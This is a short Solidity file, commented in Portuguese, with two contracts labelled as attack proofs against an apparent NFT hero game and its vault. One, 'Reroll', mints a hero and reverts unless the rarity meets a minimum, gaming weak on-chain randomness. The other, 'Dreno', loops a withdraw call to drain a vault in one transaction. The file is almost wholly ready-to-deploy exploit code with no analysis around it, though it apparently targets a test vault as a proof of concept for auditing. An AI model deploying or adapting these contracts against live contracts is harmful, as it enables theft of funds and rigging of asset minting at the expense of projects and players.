// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IHeroi {
  function abrirPacote(uint256 qtd) external returns (uint256);
  function herois(uint256 id) external view returns (uint8,uint8,uint8,uint8,uint8,uint8,uint8,uint8);
  function totalSupply() external view returns (uint256);
}
interface IERC20 { function approve(address,uint256) external returns (bool); }
interface ICofre { function sacar(address token, uint256 valor) external; }

/// Prova de ataque 1: RE-ROLL. Chama o mint, olha o que saiu e, se nao for do
/// nivel que quer, reverte a transacao inteira. So paga gas quando acerta.
contract Reroll {
  IHeroi public heroi;
  constructor(address h, address bstock){ heroi=IHeroi(h); IERC20(bstock).approve(h, type(uint256).max); }
  function tentar(uint8 minimo) external {
    uint256 id = heroi.abrirPacote(1);
    (uint8 rar,,,,,,,) = heroi.herois(id);
    require(rar >= minimo, "ruim, desfaz");
  }
}

/// Prova de ataque 2: DRENAR o cofre de teste em um loop, ate o teto por
/// chamada vezes N chamadas, tudo numa transacao so.
contract Dreno {
  function drenar(address cofre, address token, uint256 porVez, uint256 vezes) external {
    for(uint256 i=0;i<vezes;i++) ICofre(cofre).sacar(token, porVez);
  }
}
